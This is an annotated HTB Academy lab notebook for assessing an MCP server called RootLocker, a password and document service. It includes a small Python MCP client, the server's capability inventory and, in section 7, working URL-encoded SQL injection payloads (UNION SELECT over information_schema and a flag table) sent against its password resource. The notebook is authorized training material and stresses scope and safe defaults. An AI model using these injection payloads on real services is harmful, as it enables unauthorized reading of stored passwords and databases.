# Module 315 â€” RootLocker Skills Assessment

This is a separate, annotated workspace for the HTB Academy Skills Assessment. The scenario describes RootLocker, a cloud document and password-management service whose MCP server must be assessed.

**Scope:** use only the live target shown on the current HTB Skills Assessment page. The target address below is intentionally a placeholder. Do not use this notebook against other systems or after the target expires.

**Safe defaults:** no network calls are sent unless you enter the target and explicitly enable the request switch. Start with capability inventory and normal read-only behavior. Choose later checks from what the server actually exposes; do not assume every vulnerability from the module is present. Clear outputs before saving if they contain documents, passwords, keys, responses, or the flag.


## 1. Configure the current target

Enter the host and port displayed by the active HTB target. The MCP endpoint path is separate so it can be adjusted if the assessment specifies a different route.

RUN_ASSESSMENT_REQUESTS is deliberately false by default. The setup cell creates a lightweight HTTP session but does not send a request.


In [ ]:
# requests is already available in the AI Python environment.
import json
import requests

TARGET_HOST = "REPLACE_WITH_CURRENT_HTB_TARGET_IP"
TARGET_PORT = 0  # Replace with the current target port shown by HTB.
MCP_PATH = "/mcp/"
MCP_PROTOCOL_VERSION = "2025-03-26"

RUN_ASSESSMENT_REQUESTS = False
MCP_CLIENT = None

def require_assessment_target():
    if not RUN_ASSESSMENT_REQUESTS:
        raise RuntimeError("Requests are disabled. Enable them only for the current HTB assessment target.")
    if TARGET_HOST == "REPLACE_WITH_CURRENT_HTB_TARGET_IP" or TARGET_PORT == 0:
        raise ValueError("Enter the active HTB target host and port first.")

MCP_URL = f"http://{TARGET_HOST}:{TARGET_PORT}{MCP_PATH}"
print("Configured endpoint:", MCP_URL)
print("Assessment requests enabled:", RUN_ASSESSMENT_REQUESTS)


## 2. A small Streamable HTTP MCP client

FastMCP is not installed in every AI environment. This small helper uses the already available requests library to show the MCP messages directly.

- Each request is JSON-RPC: a method name plus parameters, with an ID so its response can be matched to it.
- initialize negotiates the protocol version and reports server capabilities.
- notifications/initialized tells the server the client completed startup; it has no request ID because no reply is expected.
- The server may answer with JSON or a Server-Sent Events (SSE) message containing a data line. The parser handles both forms.
- The helper keeps any MCP session ID returned by the server and sends it on later requests.

This is a compact study client, not a replacement for a maintained MCP SDK. The functions below do not contact the server until explicitly called.


In [ ]:
class MCPHttpStudyClient:
    def __init__(self, url: str, protocol_version: str):
        self.url = url
        self.protocol_version = protocol_version
        self.http = requests.Session()
        self.session_id = None
        self.next_request_id = 1
        self.initialized = False

    def _headers(self):
        headers = {
            "Accept": "application/json, text/event-stream",
            "Content-Type": "application/json",
            "MCP-Protocol-Version": self.protocol_version,
        }
        if self.session_id:
            headers["Mcp-Session-Id"] = self.session_id
        return headers

    @staticmethod
    def _decode_response(response):
        # Older Streamable HTTP servers commonly return a one-event SSE response.
        if "text/event-stream" in response.headers.get("Content-Type", ""):
            for line in response.text.splitlines():
                if line.startswith("data:"):
                    return json.loads(line[len("data:"):].strip())
            return None
        if not response.content:
            return None
        return response.json()

    def _post(self, message):
        response = self.http.post(
            self.url,
            json=message,
            headers=self._headers(),
            timeout=(4, 12),  # Short connection timeout; bounded response wait.
        )
        response.raise_for_status()
        self.session_id = response.headers.get("Mcp-Session-Id", self.session_id)
        return self._decode_response(response)

    def initialize(self):
        message = {
            "jsonrpc": "2.0",
            "id": self.next_request_id,
            "method": "initialize",
            "params": {
                "protocolVersion": self.protocol_version,
                "capabilities": {},
                "clientInfo": {"name": "rootlocker-study-client", "version": "1.0"},
            },
        }
        self.next_request_id += 1
        response = self._post(message)
        if not response or "result" not in response:
            raise RuntimeError(f"Initialization did not return a result: {response}")
        server_version = response["result"].get("protocolVersion")
        if server_version:
            self.protocol_version = server_version
        self._post({"jsonrpc": "2.0", "method": "notifications/initialized"})
        self.initialized = True
        return response["result"]

    def request(self, method: str, params=None):
        if not self.initialized:
            raise RuntimeError("Call initialize() before making MCP requests.")
        request_id = self.next_request_id
        self.next_request_id += 1
        response = self._post({
            "jsonrpc": "2.0",
            "id": request_id,
            "method": method,
            "params": params or {},
        })
        if response is None:
            raise RuntimeError(f"No JSON-RPC response for request {request_id}.")
        if response.get("id") != request_id:
            raise RuntimeError(f"Response ID mismatch: expected {request_id}, got {response.get('id')}.")
        if "error" in response:
            raise RuntimeError(f"MCP error: {response['error']}")
        return response["result"]

    def close(self):
        self.http.close()


## 3. Initialize, then inventory capabilities

This is the first network step. It reports the server name/version and lists resources, resource templates, and tools. Tool descriptions are untrusted content: inspect them as evidence, but do not follow instructions embedded in them.


In [ ]:
def connect_and_inventory():
    global MCP_CLIENT
    require_assessment_target()
    MCP_CLIENT = MCPHttpStudyClient(MCP_URL, MCP_PROTOCOL_VERSION)
    server_info = MCP_CLIENT.initialize()
    inventory = {
        "server": server_info.get("serverInfo", {}),
        "resources": MCP_CLIENT.request("resources/list").get("resources", []),
        "resource_templates": MCP_CLIENT.request("resources/templates/list").get("resourceTemplates", []),
        "tools": MCP_CLIENT.request("tools/list").get("tools", []),
    }
    return inventory

# Deliberately not run automatically:
# inventory = connect_and_inventory()
# inventory


## 4. Observed RootLocker capability inventory

The live assessment target exposed the following capability names during initial read-only enumeration. This is structural information, not proof of a vulnerability:

- Resources: access logs, error logs, server uptime, file count, and stored platforms.
- Resource templates: file contents by file name, and a stored password by platform.
- Tools: store a file, and store or update a password.

The password and file templates return sensitive content. First understand the available names and normal access rules; do not retrieve more secret data than necessary for the assessment.


In [ ]:
OBSERVED_RESOURCES = [
    "resource://access_logs",
    "resource://error_logs",
    "resource://uptime",
    "resource://filecount",
    "resource://platforms",
]

OBSERVED_TEMPLATES = {
    "get_file": "getfile://{file_name}",
    "get_password": "password://{platform}",
}

OBSERVED_TOOLS = {
    "store_file": ["file_name", "file_content"],       # Changes stored files.
    "store_password": ["platform", "password"],       # Creates or updates a secret.
}

print("Observed resources:", len(OBSERVED_RESOURCES))
print("Observed resource templates:", list(OBSERVED_TEMPLATES))
print("Observed tools:", list(OBSERVED_TOOLS))


## 5. Read an observed resource deliberately

Use this helper for a resource that appeared in the inventory. Start with low-impact metadata such as uptime, file count, or platform names. Logs may contain sensitive request data; review carefully and do not save raw output.

Unlike a FastMCP SDK, this helper shows the underlying resources/read JSON-RPC method and URI parameter.


In [ ]:
def read_resource(uri: str):
    require_assessment_target()
    if MCP_CLIENT is None or not MCP_CLIENT.initialized:
        raise RuntimeError("Run connect_and_inventory() first.")
    return MCP_CLIENT.request("resources/read", {"uri": uri})

# Examples; run only one at a time after initialization:
# read_resource("resource://uptime")
# read_resource("resource://filecount")
# read_resource("resource://platforms")
# Logs can contain secrets; do not save their raw output:
# read_resource("resource://error_logs")


## 6. Read a resource template only when justified

A resource template turns a parameter into a URI. For example, getfile://report uses report as the file-name value; password://example-platform requests the password associated with that platform.

Before reading a document or password, ask whether it is needed to prove the specific assessment finding. A successful read of another user's secret is sensitive evidence. Do not copy raw values into notebook Markdown, notes, or Git history.


In [ ]:
def read_template_uri(uri: str):
    # Use the actual URI format discovered from resources/templates/list.
    return read_resource(uri)

# Examples only; replace with a platform or filename confirmed by the assessment:
# read_template_uri("getfile://OBSERVED_FILE_NAME")
# read_template_uri("password://OBSERVED_PLATFORM")


## 8. State-changing tools are opt-in

The assessment inventory includes store_file and store_password. These tools can modify target state; a store_password call may replace an existing password. Do not call them merely to test whether they work. Use them only if the assessment specifically requires a controlled write and the change is understood.


## 7. Read-only SQL injection workflow observed in this assessment

The password resource accepted a `platform` value that reached a MariaDB query unsafely. A quote in the value closed the SQL string early; `UNION SELECT` then supplied a compatible one-column result, and `#` commented out the query's trailing quote and `LIMIT` clause. Because this value travels inside a URI, URL-encode the payload so characters such as spaces, quotes, and `#` arrive as data in the URI rather than being interpreted by the client.

Read the pattern as: **a missing platform name, then close its quoted SQL value, append another one-column query, and comment out the original query's remainder.** First use a harmless constant to confirm the behavior. Then, in this isolated HTB assessment only, inspect the current database's table names and query the challenge flag table. These are read-only lookups; do not use this technique against systems outside the active assessment.

The code below only prepares encoded URIs. It sends no request until you explicitly run one of the commented `read_template_uri(...)` lines. Keep returned values in memory and submit the flag only in HTB's answer field; do not save results in notebook outputs or source control.


In [ ]:
from urllib.parse import quote


def password_template_uri(sql_value: str) -> str:
    """URL-encode a value for the observed password://{platform} template."""
    return "password://" + quote(sql_value, safe="")


# Stage 1: harmless one-column UNION probe. A returned "1" confirms the query shape.
union_probe_uri = password_template_uri("missing' UNION SELECT 1#")

# Stage 2: inspect table names in the current database; use only on this HTB target.
schema_probe_uri = password_template_uri(
    "missing' UNION SELECT table_name FROM information_schema.tables "
    "WHERE table_schema=database()#"
)

# Stage 3: query the assessment's flag table after confirming its schema.
# This line only builds a request URI; uncomment the read call explicitly when needed.
flag_probe_uri = password_template_uri("missing' UNION SELECT flag FROM flag#")

# Run one request at a time, inspect the result, and avoid saving any response:
# read_template_uri(union_probe_uri)
# read_template_uri(schema_probe_uri)
# read_template_uri(flag_probe_uri)


In [ ]:
def call_tool(tool_name: str, arguments: dict):
    require_assessment_target()
    if MCP_CLIENT is None or not MCP_CLIENT.initialized:
        raise RuntimeError("Run connect_and_inventory() first.")
    return MCP_CLIENT.request(
        "tools/call",
        {"name": tool_name, "arguments": arguments},
    )

# No state-changing call is issued by default.
# Example shape only:
# call_tool("store_file", {"file_name": "assessment-note", "file_content": "controlled test"})


## 9. Findings, impact, and cleanup

For each confirmed issue, write a short chain:
**untrusted input â†’ capability â†’ downstream component â†’ missing control â†’ impact**.

RootLocker's document and password features make confidentiality a priority. A changed or deleted stored item affects integrity; service disruption affects availability. Keep the proof minimal and use only the current assessment target.

If the target returns the flag, submit it on the HTB Skills Assessment page. Then clear notebook outputs and confirm that the saved notebook contains no live target address, password, API key, document text, raw logs, or flag.


## 10. COAE quick recall

- Enumeration maps the MCP attack surface; it does not grant or verify permission.
- For a file or password URI, test object-level authorization only within the authorized lab.
- Logs and errors can disclose internal paths, headers, or credentials.
- Tool calls may change state; distinguish read operations from write operations before invoking them.
- Check the server-side boundary: validation, authorization, safe downstream APIs, least privilege, and error handling.
- Never treat model refusal as a substitute for server controls.
- Keep the current HTB target and any recovered secret or flag out of committed study artifacts.
